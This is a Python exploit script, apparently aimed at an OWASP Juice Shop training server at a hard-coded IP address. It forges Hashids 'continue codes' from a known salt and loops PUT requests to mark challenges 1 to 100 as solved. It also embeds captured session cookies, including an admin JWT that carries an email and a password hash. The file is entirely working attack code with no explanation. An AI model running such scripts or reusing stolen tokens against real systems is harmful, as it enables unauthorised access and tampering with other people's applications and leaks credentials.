# https://hashids.org/python/
from hashids import Hashids
import requests
# change URL as needed
URL = " http://157.201.228.164/rest/continue-code/apply/"
# comment out or change the cookie as needed
mycookie = {'balancer': 's%3At-compsci.03QVAHQ9DZZR8L43CTX3v9U6hio80nLqp5rIDTyqWf8',
            'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InN1cHBvcnRAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjM4Njk0MzNkNzRlM2QwYzg2ZmQyNTU2MmY4MzZiYzgyIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDYtMTYgMjI6Mzk6MjYuNDc4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDYtMTYgMjI6Mzk6MjYuNDc4ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1NTQ3NjQ1MiwiZXhwIjoxNjU1NDk0NDUyfQ.y1wbr0NE2ZBFfpzJE-uFLCa_cR951z4z8m3Y6nZCjQw_PHkV6v1AVcpMzsjy1gbMEAeHa5YR0SLqsKzrLGRfqq62MyO0-LlfrOXmFVbK0baHt7osk2rPnqPtmhD7fwiGzPw3LCVLbFKMDWKl0wrA5VIcIsxlJBvsIYiLb7_vW50',
            'continueCode': 'v7ubhvtbIkTEs4FzikUNH8u4hEt7cvIQTgCKsLFWiMfySaH6uPhzt7cVCPsLF6iKfvSbU3HwPuRRh1KtNXcmETnZFpziMZfBESnQUy3Hznuegh1ecW7ILlTKnCPDsJEFyvSpyUg4uMEt85c3mT4PCbBsvEiQBfN4SqyUQZhwmtkzcmmI8KTm8sKLF8MiKRfaoSmOUxl'}


hashids = Hashids(salt="this is my salt", min_length=60,
                  alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
# starts at chalange 100 down to 0
for i in range(100, 0, -1):
    id = hashids.encode(i)
    # print(id)
    URL = f"http://157.201.228.164/rest/continue-code/apply/{id}"
    print(URL)
    number = hashids.decode(id)
    print(number)
    r = requests.put(url=URL, cookies=mycookie)


print("DONE")
